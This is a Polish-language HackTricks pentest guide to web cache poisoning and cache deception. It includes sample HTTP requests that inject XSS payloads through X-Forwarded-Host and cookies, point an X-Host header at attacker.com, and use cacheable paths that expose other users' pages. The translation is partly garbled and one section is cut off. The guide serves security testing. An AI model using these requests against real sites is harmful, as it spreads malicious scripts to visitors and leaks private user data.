# Zatrucie pamici podrcznej i oszustwo pamici podrcznej

<details>

<summary><strong>Dowiedz si, jak hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
U偶yj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby atwo tworzy i **automatyzowa przepywy pracy** przy u偶yciu najbardziej zaawansowanych narzdzi spoecznoci na wiecie.\
Otrzymaj dostp ju偶 dzi:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## R贸偶nica

> **Jaka jest r贸偶nica midzy zatruciem pamici podrcznej a oszustwem pamici podrcznej?**
>
> * W **zatruciu pamici podrcznej** atakujcy powoduje, 偶e aplikacja przechowuje w pamici podrcznej pewne zoliwe treci, a te treci s serwowane z pamici podrcznej innym u偶ytkownikom aplikacji.
> * W **oszustwie pamici podrcznej** atakujcy powoduje, 偶e aplikacja przechowuje w pamici podrcznej pewne wra偶liwe treci nale偶ce do innego u偶ytkownika, a nastpnie atakujcy odzyskuje te treci z pamici podrcznej.

## Zatrucie pamici podrcznej

Zatrucie pamici podrcznej ma na celu manipulacj pamici podrczn po stronie klienta, aby zmusi klient贸w do adowania zasob贸w, kt贸re s nieoczekiwane, czciowe lub kontrolowane przez atakujcego. Zakres wpywu zale偶y od popularnoci dotknitej strony, poniewa偶 ska偶ona odpowied藕 jest serwowana wycznie u偶ytkownikom odwiedzajcym stron podczas okresu zanieczyszczenia pamici podrcznej.

Wykonanie ataku zatrucia pamici podrcznej obejmuje kilka krok贸w:

1. **Identyfikacja niezakodowanych danych wejciowych**: S to parametry, kt贸re, chocia偶 nie s wymagane do przechowywania 偶dania w pamici podrcznej, mog zmieni odpowied藕 zwr贸con przez serwer. Identyfikacja tych danych wejciowych jest kluczowa, poniewa偶 mog by wykorzystane do manipulacji pamici podrczn.

2. **Wykorzystanie niezakodowanych danych wejciowych**: Po zidentyfikowaniu niezakodowanych danych wejciowych, kolejnym krokiem jest zrozumienie, jak wykorzysta te parametry do modyfikacji odpowiedzi serwera w spos贸b korzystny dla atakujcego.

3. **Zapewnienie, 偶e ska偶ona odpowied藕 jest przechowywana w pamici podrcznej**: Ostatnim krokiem jest zapewnienie, 偶e zmodyfikowana odpowied藕 jest przechowywana w pamici podrcznej. W ten spos贸b ka偶dy u偶ytkownik uzyskujcy dostp do dotknitej strony podczas ska偶enia pamici podrcznej otrzyma ska偶on odpowied藕.

### Odkrywanie: Sprawdzanie nag贸wk贸w HTTP

Zwykle, gdy odpowied藕 zostaa **przechowana w pamici podrcznej**, bdzie istnia **nag贸wek wskazujcy na to**, mo偶na sprawdzi, na jakie nag贸wki nale偶y zwr贸ci uwag w tym pocie: [**Nag贸wki pamici podrcznej HTTP**](../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Odkrywanie: Przechowywanie kodu 400 w pamici podrcznej

Jeli podejrzewasz, 偶e odpowied藕 jest przechowywana w pamici podrcznej, mo偶esz spr贸bowa **wysa 偶dania z nieprawidowym nag贸wkiem**, na kt贸re powinno by odpowiedzi **kod stanu 400**. Nastpnie spr贸buj normalnie uzyska dostp do 偶dania i jeli **odpowied藕 to kod stanu 400**, wiesz, 偶e jest podatne (i mo偶esz nawet przeprowadzi atak typu DoS).\
Nieprawidowo skonfigurowanym nag贸wkiem mo偶e by po prostu `\:` jako nag贸wek.\
Nale偶y zauwa偶y, 偶e czasami tego rodzaju kody stanu nie s przechowywane w pamici podrcznej, wic ten test bdzie bezu偶yteczny.

### Odkrywanie: Identyfikacja i ocena niezakodowanych danych wejciowych

Mo偶esz u偶y [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943), aby **przez pr贸b i bd** przeprowadzi atak na parametry i nag贸wki, kt贸re mog **zmienia odpowied藕 strony**. Na przykad strona mo偶e u偶ywa nag贸wka `X-Forwarded-For`, aby wskaza klientowi, skd ma zaadowa skrypt:
```markup
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### Wywoanie szkodliwej odpowiedzi z serwera backendowego

Po zidentyfikowaniu parametru/nag贸wka sprawd藕, jak jest on **oczyszczany** i **gdzie** jest **odzwierciedlany** lub wpywa na odpowied藕 z nag贸wka. Czy mo偶na go w jaki spos贸b wykorzysta (wykona XSS lub zaadowa kod JS kontrolowany przez ciebie? przeprowadzi atak DoS?...)

### Pobierz odpowied藕 z pamici podrcznej

Po zidentyfikowaniu **strony**, kt贸ra mo偶e by wykorzystana, **parametru/nag贸wka**, kt贸ry nale偶y u偶y i **sposobu** jego wykorzystania, musisz zdoby stron z pamici podrcznej. W zale偶noci od zasobu, kt贸ry pr贸bujesz umieci w pamici podrcznej, mo偶e to zaj troch czasu, mo偶liwe, 偶e bdziesz musia pr贸bowa przez kilka sekund.\
Nag贸wek **`X-Cache`** w odpowiedzi mo偶e by bardzo przydatny, poniewa偶 mo偶e mie warto **`miss`**, gdy 偶danie nie zostao umieszczone w pamici podrcznej, i warto **`hit`**, gdy jest umieszczone w pamici podrcznej.\
Nag贸wek **`Cache-Control`** r贸wnie偶 jest interesujcy, aby dowiedzie si, czy zas贸b jest umieszczany w pamici podrcznej i kiedy zostanie ponownie umieszczony w pamici podrcznej: `Cache-Control: public, max-age=1800`\
Innym interesujcym nag贸wkiem jest **`Vary`**. Ten nag贸wek jest czsto u偶ywany do **wskazania dodatkowych nag贸wk贸w**, kt贸re s traktowane jako **cz klucza pamici podrcznej**, nawet jeli normalnie nie s kluczowe. Dlatego jeli u偶ytkownik zna `User-Agent` ofiary, kt贸r celuje, mo偶e zatru pami podrczn dla u偶ytkownik贸w korzystajcych z tego konkretnego `User-Agent`.\
Jeszcze jeden nag贸wek zwizany z pamici podrczn to **`Age`**. Okrela on czas w sekundach, przez kt贸ry obiekt znajduje si w pamici podrcznej serwera poredniczcego.

Podczas umieszczania 偶dania w pamici podrcznej **uwa偶aj na u偶ywane nag贸wki**, poniewa偶 niekt贸re z nich mog by **niespodziewanie u偶ywane jako kluczowe**, a ofiara bdzie musiaa u偶y tego samego nag贸wka. Zawsze **testuj** zatruwanie pamici podrcznej z **r贸偶nymi przegldarkami**, aby sprawdzi, czy dziaa.

## Przykady wykorzystania

### Najprostszy przykad

Nag贸wek tak jak `X-Forwarded-For` jest odbijany w odpowiedzi bez oczyszczania.\
Mo偶esz wysa podstawowy adunek XSS i zatru pami podrczn, dziki czemu ka偶dy, kto odwiedza stron, zostanie poddany atakowi XSS:
```markup
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Nale偶y zauwa偶y, 偶e to spowoduje zatrucie 偶dania do `/en?region=uk`, a nie do `/en`_

### Wykorzystanie zatrucia pamici podrcznej sieci web do wykorzystania podatnoci zwizanych z obsug plik贸w cookie

Pliki cookie mog r贸wnie偶 by odzwierciedlane w odpowiedzi strony. Jeli mo偶na je wykorzysta do spowodowania ataku XSS, na przykad, mo偶na bdzie wykorzysta XSS w kilku klientach, kt贸re wczytuj zoliw odpowied藕 z pamici podrcznej.
```markup
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Zauwa偶, 偶e jeli podatne ciasteczko jest bardzo czsto u偶ywane przez u偶ytkownik贸w, regularne 偶dania bd czyci pami podrczn.

### Wykorzystanie wielu nag贸wk贸w do wykorzystania podatnoci na zatrucie pamici podrcznej witryny <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Czasami bdziesz musia wykorzysta **kilka niezale偶nych wej**, aby m贸c nadu偶y pamici podrcznej. Na przykad, mo偶esz znale藕 **przekierowanie otwarte** jeli ustawisz `X-Forwarded-Host` na domen kontrolowan przez ciebie i `X-Forwarded-Scheme` na `http`. **Jeli** serwer przekierowuje wszystkie 偶dania **HTTP** na **HTTPS** i u偶ywa nag贸wka `X-Forwarded-Scheme` jako nazwy domeny dla przekierowania. Mo偶esz kontrolowa, gdzie strona jest przekierowywana.
```markup
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Wykorzystywanie z ograniczonym nag贸wkiem `Vary`

Jeli odkryjesz, 偶e nag贸wek **`X-Host`** jest u偶ywany jako **nazwa domeny do adowania zasobu JS**, ale nag贸wek **`Vary`** w odpowiedzi wskazuje na **`User-Agent`**, musisz znale藕 spos贸b na wydostanie User-Agent ofiary i zatrucie pamici podrcznej, u偶ywajc tego user agenta:
```markup
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Wykorzystywanie zatrucia pamici podrcznej HTTP poprzez nadu偶ycie Smuglowania 偶da HTTP

Dowiedz si tutaj, jak przeprowadzi ataki na zatrucie pamici podrcznej, nadu偶ywajc Smuglowania 偶da HTTP.

### Automatyczne testowanie zatrucia pamici podrcznej sieci Web

[Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) mo偶na u偶y do automatycznego testowania zatrucia pamici podrcznej sieci Web. Obsuguje wiele r贸偶nych technik i jest bardzo konfigurowalny.

Przykadowe u偶ycie: `wcvs -u example.com`

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
U偶yj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby atwo tworzy i **automatyzowa zadania** z wykorzystaniem najbardziej zaawansowanych narzdzi spoecznociowych na wiecie.\
Otrzymaj dostp ju偶 dzi:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Przykady podatnoci

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS przekazywa fragment wewntrz adresu URL bez usuwania go i generowa klucz pamici podrcznej, u偶ywajc tylko hosta, cie偶ki i zapytania (ignorujc fragment). Dlatego 偶danie `/#/../?r=javascript:alert(1)` zostao wysane do backendu jako `/#/../?r=javascript:alert(1)`, a klucz pamici podrcznej nie zawiera adunku, tylko hosta, cie偶k i zapytanie.

### GitHub CP-DoS

Wysanie nieprawidowej wartoci w nag贸wku `content-type` wywoywao odpowied藕 405 z pamici podrcznej. Klucz pamici podrcznej zawiera ciasteczko, wic mo偶liwe byo tylko atakowanie nieuwierzytelnionych u偶ytkownik贸w.

### GitLab + GCP CP-DoS

GitLab u偶ywa kubek贸w GCP do przechowywania statycznych treci. **Kubeki GCP** obsuguj **nag贸wek `x-http-method-override`**. Dlatego mo偶na byo wysa nag贸wek `x-http-method-override: HEAD` i zatruci pami podrczn, zwracajc pusty ciao odpowiedzi. Mo偶e r贸wnie偶 obsugiwa metod `PURGE`.

### Rack Middleware (Ruby on Rails)

W aplikacjach Ruby on Rails czsto wykorzystuje si oprogramowanie poredniczce Rack. Kod Rack ma na celu pobranie wartoci nag贸wka **`x-forwarded-scheme`** i ustawienie jej jako schematu 偶dania. Gdy wysany jest nag贸wek `x-forwarded-scheme: http`, nastpuje przekierowanie 301 do tej samej lokalizacji, co potencjalnie powoduje odmow usugi (DoS) dla tego zasobu. Dodatkowo, aplikacja mo偶e uwzgldnia nag贸wek `X-forwarded-host` i przekierowywa u偶ytkownik贸w na okrelony host. To zachowanie mo偶e prowadzi do adowania plik贸w JavaScript z serwera atakujcego, co stanowi ryzyko dla bezpieczestwa.

### 403 i kubeki przechowywania

Cloudflare wczeniej buforowa odpowiedzi 403. Pr贸ba dostpu do zasob贸w S3 lub Azure Storage Blobs z nieprawidowymi nag贸wkami autoryzacji skutkowaa odpowiedzi 403, kt贸ra bya buforowana. Chocia偶 Cloudflare zaprzesta buforowania odpowiedzi 403, to zachowanie to mo偶e nadal wystpowa w innych usugach proxy.

### Wstrzykiwanie parametr贸w kluczowych

Bufory podrczne czsto zawieraj okrelone parametry GET w kluczu pamici podrcznej. Na przykad, Varnish Fastly buforowa parametr `size` w 偶daniach. Jednak jeli wraz z poprawn wartoci zostaa wysana r贸wnie偶 zakodowana warto parametru (np. `siz%65`) z bdn wartoci, klucz pamici podrcznej by konstruowany przy u偶yciu poprawnego parametru `size`. Jednak backend przetwarza warto w zakodowanym parametrze URL. Zakodowanie drugiego parametru `size` powodowao jego pominicie przez pami podrczn, ale wykorzystanie przez backend. Przypisanie wartoci 0 do tego parametru skutkowao buforowalnym bdem 400 Bad Request.

### Reguy agenta u偶ytkownika

Niekt贸rzy programici blokuj 偶dania z agentami u偶ytkownika pasujcymi do narzdzi o du偶ym ruchu, takich jak FFUF lub Nuclei, aby zarzdza obci偶eniem serwera. Ironicznie, takie podejcie mo偶e wprowadza podatnoci, takie jak zatrucie pamici podrcznej i DoS.

### Nielegalne pola nag贸wka

[RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) okrela dopuszczalne znaki w nazwach nag贸wk贸w. Nag贸wki zawierajce znaki spoza okrelonego zakresu **tchar** powinny idealnie wywoywa odpowied藕 400 Bad Request. W praktyce serwery nie zawsze przestrzegaj tego standardu. Przykadem jest Akamai, kt贸ry przekazuje nag贸wki z nieprawidowymi znakami i buforuje ka偶dy bd 400, o ile nie jest obecny nag贸wek `cache-control`. Zidentyfikowano wzorzec podatny na wykorzystanie, w kt贸rym wysanie nag贸wka z nielegalnym znakiem, takim jak `\`, skutkowao buforowalnym bdem 400 Bad Request.

### Wyszukiwanie nowych nag贸wk贸w

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Zatrucie pamici podrcznej

Celem zatrucia pamici podrcznej jest sprawienie, aby klienci **adowali zasoby, kt贸re zostan zapisane w pamici podrcznej wraz z ich poufnymi informacjami**.

Po pierwsze, zauwa偶, 偶e **rozszerzenia** takie jak `.css`, `.js`, `.png` itp. s zazwyczaj **skonfigurowane** do **zapisywania** w **pamici podrcznej**. Dlatego jeli uzyskasz dostp do `www.example.com/profile.php/nonexistent.js`, pami podrczna prawdopodobnie przechowa odpowied藕, poniewa偶 widzi rozszerzenie `.js`. Jednak jeli **aplikacja** odtwarza **poufne** treci u偶ytkownika przechowywane w _www.example.com/profile.php_, mo偶na **ukra** te treci od innych u偶ytkownik贸w.

Inne rzeczy do przetestowania:

* _www.example.com/profile.php/.js_
* _www.example.com/profile.php/.
<summary><strong>Dowiedz si, jak hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy **reklam swojej firmy w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.
